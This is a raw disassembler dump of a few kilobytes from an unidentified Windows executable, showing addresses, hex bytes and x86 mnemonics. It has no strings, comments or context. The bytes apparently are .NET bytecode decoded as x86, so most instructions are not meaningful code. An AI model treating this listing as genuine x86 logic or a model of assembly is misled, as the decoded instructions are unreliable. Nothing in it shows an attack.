  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 48             	or     0x48(%edx),%dh
  403d47:	21 00                	and    %eax,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	e2 01                	loop   0x403da7
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 4e                	jb     0x403e0f
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	39 a4 01 00 00 07 72 	cmp    %esp,0x72070000(%ecx,%eax,1)
  403dd7:	ae                   	scas   %es:(%edi),%al
  403dd8:	25 00 70 28 25       	and    $0x25287000,%eax
  403ddd:	00 00                	add    %al,(%eax)
  403ddf:	0a 3a                	or     (%edx),%bh
  403de1:	25 00 00 00 07       	and    $0x7000000,%eax
  403de6:	72 b8                	jb     0x403da0
  403de8:	25 00 70 28 25       	and    $0x25287000,%eax
  403ded:	00 00                	add    %al,(%eax)
  403def:	0a 3a                	or     (%edx),%bh
  403df1:	60                   	pusha
  403df2:	00 00                	add    %al,(%eax)
  403df4:	00 07                	add    %al,(%edi)
  403df6:	72 c6                	jb     0x403dbe
  403df8:	25 00 70 28 25       	and    $0x25287000,%eax
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	0a 3a                	or     (%edx),%bh
  403e01:	d9 00                	flds   (%eax)
  403e03:	00 00                	add    %al,(%eax)
  403e05:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e08:	00 00                	add    %al,(%eax)
  403e0a:	16                   	push   %ss
  403e0b:	28 1a                	sub    %bl,(%edx)
  403e0d:	00 00                	add    %al,(%eax)
  403e0f:	06                   	push   %es
  403e10:	73 94                	jae    0x403da6
  403e12:	00 00                	add    %al,(%eax)
  403e14:	06                   	push   %es
  403e15:	25 72 4e 21 00       	and    $0x214e72,%eax
  403e1a:	70 6f                	jo     0x403e8b
  403e1c:	7f 00                	jg     0x403e1e
  403e1e:	00 06                	add    %al,(%esi)
  403e20:	72 ae                	jb     0x403dd0
  403e22:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e27:	00 00                	add    %al,(%eax)
  403e29:	06                   	push   %es
  403e2a:	25 72 66 21 00       	and    $0x216672,%eax
  403e2f:	70 6f                	jo     0x403ea0
  403e31:	7f 00                	jg     0x403e33
  403e33:	00 06                	add    %al,(%esi)
  403e35:	28 17                	sub    %dl,(%edi)
  403e37:	00 00                	add    %al,(%eax)
  403e39:	06                   	push   %es
  403e3a:	6a 6f                	push   $0x6f
  403e3c:	74 00                	je     0x403e3e
  403e3e:	00 06                	add    %al,(%esi)
  403e40:	6f                   	outsl  %ds:(%esi),(%dx)
  403e41:	89 00                	mov    %eax,(%eax)
  403e43:	00 06                	add    %al,(%esi)
  403e45:	28 20                	sub    %ah,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	16                   	push   %ss
  403e4b:	28 18                	sub    %bl,(%eax)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	06                   	push   %es
  403e50:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e53:	00 00                	add    %al,(%eax)
  403e55:	00 06                	add    %al,(%esi)
  403e57:	72 dc                	jb     0x403e35
  403e59:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403e5e:	00 00                	add    %al,(%eax)
  403e60:	06                   	push   %es
  403e61:	6f                   	outsl  %ds:(%esi),(%dx)
  403e62:	8b 00                	mov    (%eax),%eax
  403e64:	00 06                	add    %al,(%esi)
  403e66:	28 42 00             	sub    %al,0x0(%edx)
  403e69:	00 06                	add    %al,(%esi)
  403e6b:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e6f:	00 7e 24             	add    %bh,0x24(%esi)
  403e72:	00 00                	add    %al,(%eax)
  403e74:	04 06                	add    $0x6,%al
  403e76:	6f                   	outsl  %ds:(%esi),(%dx)
  403e77:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e7c:	94                   	xchg   %eax,%esp
  403e7d:	00 00                	add    %al,(%eax)
  403e7f:	06                   	push   %es
  403e80:	25 72 4e 21 00       	and    $0x214e72,%eax
  403e85:	70 6f                	jo     0x403ef6
  403e87:	7f 00                	jg     0x403e89
  403e89:	00 06                	add    %al,(%esi)
  403e8b:	72 e4                	jb     0x403e71
  403e8d:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e92:	00 00                	add    %al,(%eax)
  403e94:	06                   	push   %es
  403e95:	25 72 fa 25 00       	and    $0x25fa72,%eax
  403e9a:	70 6f                	jo     0x403f0b
  403e9c:	7f 00                	jg     0x403e9e
  403e9e:	00 06                	add    %al,(%esi)
  403ea0:	06                   	push   %es
  403ea1:	72 dc                	jb     0x403e7f
  403ea3:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ea8:	00 00                	add    %al,(%eax)
  403eaa:	06                   	push   %es
  403eab:	6f                   	outsl  %ds:(%esi),(%dx)
  403eac:	8b 00                	mov    (%eax),%eax
  403eae:	00 06                	add    %al,(%esi)
  403eb0:	6f                   	outsl  %ds:(%esi),(%dx)
  403eb1:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb7:	00 00                	add    %al,(%eax)
  403eb9:	06                   	push   %es
  403eba:	28 20                	sub    %ah,(%eax)
  403ebc:	00 00                	add    %al,(%eax)
  403ebe:	06                   	push   %es
  403ebf:	38 06                	cmp    %al,(%esi)
  403ec1:	00 00                	add    %al,(%eax)
  403ec3:	00 06                	add    %al,(%esi)
  403ec5:	28 47 00             	sub    %al,0x0(%edi)
  403ec8:	00 06                	add    %al,(%esi)
  403eca:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403ed0:	b3 00                	mov    $0x0,%bl
  403ed2:	00 0a                	add    %cl,(%edx)
  403ed4:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed7:	00 06                	add    %al,(%esi)
  403ed9:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403edf:	72 08                	jb     0x403ee9
  403ee1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403ee5:	7f 00                	jg     0x403ee7
  403ee7:	00 06                	add    %al,(%esi)
  403ee9:	6f                   	outsl  %ds:(%esi),(%dx)
  403eea:	8b 00                	mov    (%eax),%eax
  403eec:	00 06                	add    %al,(%esi)
  403eee:	06                   	push   %es
  403eef:	72 dc                	jb     0x403ecd
  403ef1:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ef6:	00 00                	add    %al,(%eax)
  403ef8:	06                   	push   %es
  403ef9:	6f                   	outsl  %ds:(%esi),(%dx)
  403efa:	7a 00                	jp     0x403efc
  403efc:	00 06                	add    %al,(%esi)
  403efe:	28 41 00             	sub    %al,0x0(%ecx)
  403f01:	00 06                	add    %al,(%esi)
  403f03:	26 7e 24             	es jle 0x403f2a
  403f06:	00 00                	add    %al,(%eax)
  403f08:	04 28                	add    $0x28,%al
  403f0a:	01 00                	add    %eax,(%eax)
  403f0c:	00 2b                	add    %ch,(%ebx)
  403f0e:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0f:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f14:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f18:	00 12                	add    %dl,(%edx)
  403f1a:	02 28                	add    (%eax),%ch
  403f1c:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f21:	09 72 dc             	or     %esi,-0x24(%edx)
  403f24:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f29:	00 00                	add    %al,(%eax)
  403f2b:	06                   	push   %es
  403f2c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f2d:	8b 00                	mov    (%eax),%eax
  403f2f:	00 06                	add    %al,(%esi)
  403f31:	06                   	push   %es
  403f32:	72 08                	jb     0x403f3c
  403f34:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f38:	7f 00                	jg     0x403f3a
  403f3a:	00 06                	add    %al,(%esi)
  403f3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f3d:	8b 00                	mov    (%eax),%eax
  403f3f:	00 06                	add    %al,(%esi)
  403f41:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f47:	12 00                	adc    (%eax),%al
  403f49:	00 00                	add    %al,(%eax)
  403f4b:	09 28                	or     %ebp,(%eax)
  403f4d:	47                   	inc    %edi
  403f4e:	00 00                	add    %al,(%eax)
  403f50:	06                   	push   %es
  403f51:	7e 24                	jle    0x403f77
  403f53:	00 00                	add    %al,(%eax)
  403f55:	04 09                	add    $0x9,%al
  403f57:	6f                   	outsl  %ds:(%esi),(%dx)
  403f58:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f5d:	12 02                	adc    (%edx),%al
  403f5f:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f65:	b3 dd                	mov    $0xdd,%bl
  403f67:	0e                   	push   %cs
  403f68:	00 00                	add    %al,(%eax)
  403f6a:	00 12                	add    %dl,(%edx)
  403f6c:	02 fe                	add    %dh,%bh
  403f6e:	16                   	push   %ss
  403f6f:	04 00                	add    $0x0,%al
  403f71:	00 1b                	add    %bl,(%ebx)
  403f73:	6f                   	outsl  %ds:(%esi),(%dx)
  403f74:	33 00                	xor    (%eax),%eax
  403f76:	00 0a                	add    %cl,(%edx)
  403f78:	dc dd                	(bad)
  403f7a:	0f 00 00             	sldt   (%eax)
  403f7d:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f80:	00 00                	add    %al,(%eax)
  403f82:	0a 28                	or     (%eax),%ch
  403f84:	49                   	dec    %ecx
  403f85:	00 00                	add    %al,(%eax)
  403f87:	06                   	push   %es
  403f88:	dd 00                	fldl   (%eax)
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 2a                	add    %ch,(%edx)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	41                   	inc    %ecx
  403f91:	4c                   	dec    %esp
  403f92:	00 00                	add    %al,(%eax)
  403f94:	00 00                	add    %al,(%eax)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	aa                   	stos   %al,%es:(%edi)
  403f99:	00 00                	add    %al,(%eax)
  403f9b:	00 79 00             	add    %bh,0x0(%ecx)
  403f9e:	00 00                	add    %al,(%eax)
  403fa0:	23 01                	and    (%ecx),%eax
  403fa2:	00 00                	add    %al,(%eax)
  403fa4:	0f 00 00             	sldt   (%eax)
  403fa7:	00 31                	add    %dh,(%ecx)
  403fa9:	00 00                	add    %al,(%eax)
  403fab:	01 02                	add    %eax,(%edx)
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 68 01             	add    %ch,0x1(%eax)
  403fb2:	00 00                	add    %al,(%eax)
  403fb4:	57                   	push   %edi
  403fb5:	00 00                	add    %al,(%eax)
  403fb7:	00 bf 01 00 00 0e    	add    %bh,0xe000001(%edi)
	...
  403fc9:	00 00                	add    %al,(%eax)
  403fcb:	00 d2                	add    %dl,%dl
  403fcd:	01 00                	add    %eax,(%eax)
  403fcf:	00 d2                	add    %dl,%dl
  403fd1:	01 00                	add    %eax,(%eax)
  403fd3:	00 0f                	add    %cl,(%edi)
  403fd5:	00 00                	add    %al,(%eax)
  403fd7:	00 31                	add    %dh,(%ecx)
  403fd9:	00 00                	add    %al,(%eax)
  403fdb:	01 13                	add    %edx,(%ebx)
  403fdd:	30 0b                	xor    %cl,(%ebx)
  403fdf:	00 11                	add    %dl,(%ecx)
  403fe1:	01 00                	add    %eax,(%eax)
  403fe3:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fe6:	00 11                	add    %dl,(%ecx)
  403fe8:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fee:	72 dc                	jb     0x403fcc
  403ff0:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ff5:	00 00                	add    %al,(%eax)
  403ff7:	06                   	push   %es
  403ff8:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff9:	8b 00                	mov    (%eax),%eax
  403ffb:	00 06                	add    %al,(%esi)
  403ffd:	28 42 00             	sub    %al,0x0(%edx)
  404000:	00 06                	add    %al,(%esi)
  404002:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404008:	c0 00 00             	rolb   $0x0,(%eax)
  40400b:	0a 72 12             	or     0x12(%edx),%dh
  40400e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404012:	c1 00 00             	roll   $0x0,(%eax)
  404015:	0a 28                	or     (%eax),%ch
  404017:	c2 00 00             	ret    $0x0
  40401a:	0a 0a                	or     (%edx),%cl
  40401c:	7e 25                	jle    0x404043
  40401e:	00 00                	add    %al,(%eax)
  404020:	04 3a                	add    $0x3a,%al
  404022:	85 00                	test   %eax,(%eax)
  404024:	00 00                	add    %al,(%eax)
  404026:	20 00                	and    %al,(%eax)
  404028:	01 00                	add    %eax,(%eax)
  40402a:	00 72 2e             	add    %dh,0x2e(%edx)
  40402d:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404031:	d0 0f                	rorb   $1,(%edi)
  404033:	00 00                	add    %al,(%eax)
  404035:	02 28                	add    (%eax),%ch
  404037:	c3                   	ret
  404038:	00 00                	add    %al,(%eax)
  40403a:	0a 1f                	or     (%edi),%bl
  40403c:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  404042:	25 16 16 14 28       	and    $0x28141616,%eax
  404047:	c4 00                	les    (%eax),%eax
  404049:	00 0a                	add    %cl,(%edx)
  40404b:	a2 25 17 17 14       	mov    %al,0x14171725
  404050:	28 c4                	sub    %al,%ah
  404052:	00 00                	add    %al,(%eax)
  404054:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  40405a:	28 c4                	sub    %al,%ah
  40405c:	00 00                	add    %al,(%eax)
  40405e:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  404064:	28 c4                	sub    %al,%ah
  404066:	00 00                	add    %al,(%eax)
  404068:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  40406e:	28 c4                	sub    %al,%ah
  404070:	00 00                	add    %al,(%eax)
  404072:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404078:	28 c4                	sub    %al,%ah
  40407a:	00 00                	add    %al,(%eax)
  40407c:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  404082:	28 c4                	sub    %al,%ah
  404084:	00 00                	add    %al,(%eax)
  404086:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  40408c:	28 c4                	sub    %al,%ah
  40408e:	00 00                	add    %al,(%eax)
  404090:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  404096:	28 c4                	sub    %al,%ah
  404098:	00 00                	add    %al,(%eax)
  40409a:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  4040a0:	0a 28                	or     (%eax),%ch
  4040a2:	c6 00 00             	movb   $0x0,(%eax)
  4040a5:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040ab:	7e 25                	jle    0x4040d2
  4040ad:	00 00                	add    %al,(%eax)
  4040af:	04 7b                	add    $0x7b,%al
  4040b1:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040b7:	00 00                	add    %al,(%eax)
  4040b9:	04 06                	add    $0x6,%al
  4040bb:	28 06                	sub    %al,(%esi)
  4040bd:	00 00                	add    %al,(%eax)
  4040bf:	06                   	push   %es
  4040c0:	7e 0b                	jle    0x4040cd
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	04 7e                	add    $0x7e,%al
  4040c6:	10 00                	adc    %al,(%eax)
  4040c8:	00 04 02             	add    %al,(%edx,%eax,1)
  4040cb:	72 36                	jb     0x404103
  4040cd:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040d1:	7f 00                	jg     0x4040d3
  4040d3:	00 06                	add    %al,(%esi)
  4040d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4040d6:	7a 00                	jp     0x4040d8
  4040d8:	00 06                	add    %al,(%esi)
  4040da:	7e 1e                	jle    0x4040fa
  4040dc:	00 00                	add    %al,(%eax)
  4040de:	04 7e                	add    $0x7e,%al
  4040e0:	08 00                	or     %al,(%eax)
  4040e2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040e5:	0f 00 00             	sldt   (%eax)
  4040e8:	04 7e                	add    $0x7e,%al
  4040ea:	04 00                	add    $0x0,%al
  4040ec:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040ef:	c8 00 00 0a          	enter  $0x0,$0xa
  4040f3:	28 48 00             	sub    %cl,0x0(%eax)
  4040f6:	00 06                	add    %al,(%esi)
  4040f8:	2a 00                	sub    (%eax),%al
  4040fa:	00 00                	add    %al,(%eax)
  4040fc:	1b 30                	sbb    (%eax),%esi
  4040fe:	03 00                	add    (%eax),%eax
  404100:	5c                   	pop    %esp
  404101:	00 00                	add    %al,(%eax)
  404103:	00 15 00 00 11 02    	add    %dl,0x2110000
  404109:	28 18                	sub    %bl,(%eax)
  40410b:	00 00                	add    %al,(%eax)
  40410d:	0a 03                	or     (%ebx),%al
  40410f:	28 ca                	sub    %cl,%dl
  404111:	00 00                	add    %al,(%eax)
  404113:	0a 39                	or     (%ecx),%bh
  404115:	0b 00                	or     (%eax),%eax
  404117:	00 00                	add    %al,(%eax)
  404119:	72 64                	jb     0x40417f
  40411b:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40411f:	cb                   	lret
  404120:	00 00                	add    %al,(%eax)
  404122:	0a 7a 03             	or     0x3(%edx),%bh
  404125:	7e 2c                	jle    0x404153
  404127:	00 00                	add    %al,(%eax)
  404129:	04 20                	add    $0x20,%al
  40412b:	50                   	push   %eax
  40412c:	c3                   	ret
  40412d:	00 00                	add    %al,(%eax)
  40412f:	73 cc                	jae    0x4040fd
  404131:	00 00                	add    %al,(%eax)
  404133:	0a 0a                	or     (%edx),%cl
  404135:	02 06                	add    (%esi),%al
  404137:	1f                   	pop    %ds
  404138:	20 6f cd             	and    %ch,-0x33(%edi)
  40413b:	00 00                	add    %al,(%eax)
  40413d:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404140:	00 00                	add    %al,(%eax)
  404142:	04 02                	add    $0x2,%al
  404144:	06                   	push   %es
  404145:	1f                   	pop    %ds
  404146:	40                   	inc    %eax
  404147:	6f                   	outsl  %ds:(%esi),(%dx)
  404148:	cd 00                	int    $0x0
  40414a:	00 0a                	add    %cl,(%edx)
  40414c:	7d 2b                	jge    0x404179
  40414e:	00 00                	add    %al,(%eax)
  404150:	04 dd                	add    $0xdd,%al
  404152:	0d 00 00 00 06       	or     $0x6000000,%eax
  404157:	39 06                	cmp    %eax,(%esi)
  404159:	00 00                	add    %al,(%eax)
  40415b:	00 06                	add    %al,(%esi)
  40415d:	6f                   	outsl  %ds:(%esi),(%dx)
  40415e:	33 00                	xor    (%eax),%eax
  404160:	00 0a                	add    %cl,(%edx)
  404162:	dc 2a                	fsubrl (%edx)
  404164:	01 10                	add    %edx,(%eax)
  404166:	00 00                	add    %al,(%eax)
  404168:	02 00                	add    (%eax),%al
  40416a:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  40416f:	0d 00 00 00 00       	or     $0x0,%eax
  404174:	1b 30                	sbb    (%eax),%esi
  404176:	05 00 15 01 00       	add    $0x11500,%eax
  40417b:	00 16                	add    %dl,(%esi)
  40417d:	00 00                	add    %al,(%eax)
  40417f:	11 03                	adc    %eax,(%ebx)
  404181:	3a 0b                	cmp    (%ebx),%cl
  404183:	00 00                	add    %al,(%eax)
  404185:	00 72 ac             	add    %dh,-0x54(%edx)
  404188:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40418c:	cf                   	iret
  40418d:	00 00                	add    %al,(%eax)
  40418f:	0a 7a 73             	or     0x73(%edx),%bh
  404192:	d0 00                	rolb   $1,(%eax)
  404194:	00 0a                	add    %cl,(%edx)
  404196:	0a 06                	or     (%esi),%al
  404198:	1f                   	pop    %ds
  404199:	20 6a 6f             	and    %ch,0x6f(%edx)
  40419c:	4e                   	dec    %esi
  40419d:	00 00                	add    %al,(%eax)
